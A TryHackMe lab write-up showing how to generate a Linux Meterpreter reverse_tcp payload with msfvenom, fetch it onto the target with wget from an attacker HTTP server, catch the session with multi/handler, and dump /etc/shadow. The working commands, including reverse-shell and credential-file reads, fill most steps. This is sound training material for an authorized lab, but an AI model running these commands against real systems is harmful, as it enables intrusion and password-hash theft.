# TryHackMe — Metasploit: Introduction · Task 6 (Msfvenom)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Room](https://img.shields.io/badge/Room-Metasploit_Introduction-blue)
![Task](https://img.shields.io/badge/Task-6_Msfvenom-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tools](https://img.shields.io/badge/Tools-msfvenom_·_msfconsole-purple)

> A walkthrough of Task 6 covering payload generation with `msfvenom`, payload delivery, establishing a Meterpreter session using `multi/handler`, and basic post-exploitation on a Linux target.

---

## Table of Contents

- [Room objective](#room-objective)
- [Environment setup](#environment-setup)
- [Quick summary](#quick-summary)
- [Step by step](#step-by-step)
  - [1. Start the victim VM and open an SSH session](#1-start-the-victim-vm-and-open-an-ssh-session)
  - [2. Generate the `.elf` payload with msfvenom](#2-generate-the-elf-payload-with-msfvenom)
  - [3. Transfer the payload to the victim machine](#3-transfer-the-payload-to-the-victim-machine)
  - [4. Configure the multi/handler](#4-configure-the-multihandler)
  - [5. Run the payload on the victim machine](#5-run-the-payload-on-the-victim-machine)
  - [6. Post-exploitation — Linux hash dump](#6-post-exploitation--linux-hash-dump)
- [Common Pitfalls](#common-pitfalls)
- [Lessons learned](#lessons-learned)
- [Final Thoughts](#final-thoughts)
- [References](#references)

---

## Skills Practiced

- Metasploit Framework
- msfvenom
- Meterpreter
- Linux
- Reverse TCP Payloads
- Post-Exploitation
- Linux Credential Access
- Troubleshooting

---

## Room objective

The goal of this task is to walk through the complete process of generating, delivering, and executing a custom Meterpreter payload against a Linux target.

1. Generate a Meterpreter payload in `.elf` format (Linux)
2. Transfer it to the target machine
3. Receive the reverse session via `exploit/multi/handler`
4. Extract credential hashes from other users on the system

## Environment setup

| Item | Value |
|------|-------|
| Attacker machine | Kali Linux via TryHackMe VPN |
| Victim machine | Room VM (Linux) |
| SSH user | `murphy` |
| SSH password | `1q2w3e4r` |
| Payload | `linux/x86/meterpreter/reverse_tcp` |
| Format | `.elf` |
| LPORT used | `4444` (Metasploit default) |

> [!NOTE]
> The room suggests port `7777`, but during testing port `4444` (the Metasploit default) proved more reliable. The important thing is to keep the payload and the handler consistent.

## Quick summary

```bash
# On the attacker machine
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf > shell.elf
chmod 777 shell.elf
python3 -m http.server 9000

# On the victim machine (via SSH)
sudo su
wget http://<ATTACKER_IP>:9000/shell.elf
chmod +x shell.elf

# On the attacker machine (msfconsole)
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run

# Back to the victim and execute
./shell.elf

# Post-exploitation in meterpreter
shell
cat /etc/shadow
```

---

## Step by step

### 1. Start the victim VM and open an SSH session

After starting the machine via the room's button, connect over SSH:

```bash
ssh murphy@<VICTIM_IP>
# password: 1q2w3e4r
```

> [!WARNING]
> During one of my first attempts, I forgot to switch to a root shell after connecting via SSH. It didn't seem important at first, but later prevented me from accessing `/etc/shadow` during the post-exploitation phase.

```bash
sudo su
```

### 2. Generate the `.elf` payload with msfvenom

On the attacker machine, create the Meterpreter payload in ELF format (Linux executable):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_IP> \
  LPORT=4444 \
  -f elf > shell.elf
```

**Parameter explanation:**

| Flag | Value | Meaning |
|------|-------|---------|
| `-p` | `linux/x86/meterpreter/reverse_tcp` | Meterpreter payload for Linux x86 with reverse TCP callback |
| `LHOST` | Attacker IP | Address the victim will connect back to |
| `LPORT` | `4444` | Listening port on the attacker |
| `-f` | `elf` | Output format (Linux executable) |
| `>` | `shell.elf` | Redirect to file |

> [!TIP]
> For Windows it would be `windows/meterpreter/reverse_tcp` with `-f exe`. For PHP, `php/meterpreter/reverse_tcp` with `-f raw`. The payload choice must match the victim's OS.

<!-- screenshots/02-msfvenom-payload.png -->

### 3. Transfer the payload to the victim machine

**On the attacker machine** — prepare and serve the file:

```bash
# Grant permissions so the file can be downloaded over the network
chmod 777 shell.elf

# Spin up a simple HTTP server (run it in the same directory as shell.elf)
python3 -m http.server 9000
```

> [!WARNING]
> During my testing, I used `chmod 777` to avoid permission issues while serving the payload through Python's HTTP server. Depending on your environment, less permissive settings may also work.

**On the victim machine** (via SSH):

```bash
wget http://<ATTACKER_IP>:9000/shell.elf
```

> [!NOTE]
> The Python HTTP server serves every file in the current working directory. Since this lab runs inside the TryHackMe VPN, only machines within that environment can access it.


### 4. Configure the multi/handler

Open `msfconsole` on the attacker machine and configure the listener:

```bash
msfconsole
```

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
show options
run
```

> [!WARNING]
> **The handler's LPORT must be identical to the payload's.** Common mistake: building the `.elf` with port `4444` and configuring the handler with `7777` (or vice versa). The two must match exactly, otherwise the session won't establish.

> [!TIP]
> Always run `show options` before `run` to confirm that `LHOST` and `LPORT` are correct. It becomes a habit that prevents 80% of silly mistakes.

### 5. Run the payload on the victim machine

Back in the victim's SSH session, make the file executable and run it:

```bash
# Grant execute permission
chmod +x shell.elf

# Execute
./shell.elf
```

**Order matters:** Make sure the handler is already listening before executing the payload. Otherwise, the reverse connection will fail because there's nothing waiting to receive it.
After execution, the handler on the attacker machine should show:

```
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] Sending stage (xxxxxx bytes) to <VICTIM_IP>
[*] Meterpreter session 1 opened (<ATTACKER_IP>:4444 -> <VICTIM_IP>:xxxxx)

meterpreter >
```

### 6. Post-exploitation — Linux hash dump

With the Meterpreter session active, extract the hashes of the other users on the system.

> [!WARNING]
> **Don't use `hashdump` here.** That command is specific to Windows (SAM). On Linux, hashes live in `/etc/shadow`, which requires root privilege to read.

From the Meterpreter prompt:

```
meterpreter > shell
```

Now in the system shell:

```bash
cat /etc/shadow
```

> [!WARNING]
> `/etc/shadow` is a **file**, not a directory. Trying `cd /etc/shadow` will fail. Use `cat`, `less`, or `tail` to read its contents.

> [!TIP]
> The `sudo su` back in Step 1 is exactly what grants permission to read `/etc/shadow`. Without root, that file returns `Permission denied`.

The output lists all users with their hashes in the format:

```
$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
```

Copy the hash of the user requested by the room and submit it as the answer in the TryHackMe panel.

<img width="1157" height="108" alt="Captura de tela 2026-06-28 180609" src="https://github.com/user-attachments/assets/8468bbce-02cf-481e-aa92-2994efeb5ccf" />

---

## Common Pitfalls

Points where the official material leaves gaps that stall the exercise:

1. **`sudo su` at the start is mandatory.** The room mentions it in passing, but doesn't emphasize that without it the final step fails.
2. **File permissions can prevent the payload from being downloaded or executed.** During my testing, I used `chmod 777` to avoid permission-related issues. Depending on your environment, less permissive settings may work just as well.
3. **Port 4444 vs 7777.** Although the room uses port `7777` in its example, I had more consistent results using the default Metasploit port (`4444`). Either option works as long as the payload and the handler are configured with the same port.
4. **`hashdump` is Windows-only.** On Linux, reading is done directly via `cat /etc/shadow`.
5. **`/etc/shadow` is a file, not a directory.** Common mistake for those starting out with Linux.
6. **The payload's LPORT must match the handler's.** Differences here caused the most common errors reported in TryHackMe comments and Discord.

## Lessons learned

- The `msfvenom → transfer → handler → execute → post-ex` workflow is the backbone of a lot of practical exploitation exercises. Understanding each piece is fundamental before moving on to more sophisticated frameworks.
- Linux permissions (`chmod`, `sudo`) show up at **every** step. Not treating this carefully causes errors that look random but have simple causes.
- Using the default configuration provided by the tool can often be more reliable than blindly following lab instructions. In this case, port `4444` worked consistently throughout my testing.
- Differences between Windows and Linux for post-exploitation: SAM/`hashdump` vs `/etc/shadow`/`cat`. Knowing both is part of the job.
- One thing this room reinforced is that cybersecurity is largely about troubleshooting. When something doesn't work, researching the issue and understanding why is often more valuable than simply following a walkthrough.

## Final Thoughts

This was one of the most enjoyable tasks in the room.

Although the exploitation process itself wasn't particularly difficult, the troubleshooting required along the way made this one of the most valuable exercises for me.

Having to investigate permission issues, listener configuration, and Linux-specific post-exploitation techniques gave me a much better understanding of how the entire workflow fits together.

More importantly, it reinforced an important lesson: in cybersecurity, knowing how to troubleshoot and research a problem is often just as valuable as knowing the tools themselves.

~≈≈≈^>

— H1SS

## References

- [TryHackMe — Metasploit: Exploitation](https://tryhackme.com/room/metasploitexploitation)
- [Official Metasploit documentation](https://docs.metasploit.com/)
- [Offensive Security — msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [`msfvenom` manual](https://www.kali.org/tools/metasploit-framework/#msfvenom)

---

> Educational write-up, performed in an authorized environment (TryHackMe's closed lab). All actions were executed on virtual machines owned by the platform, within the permitted scope.
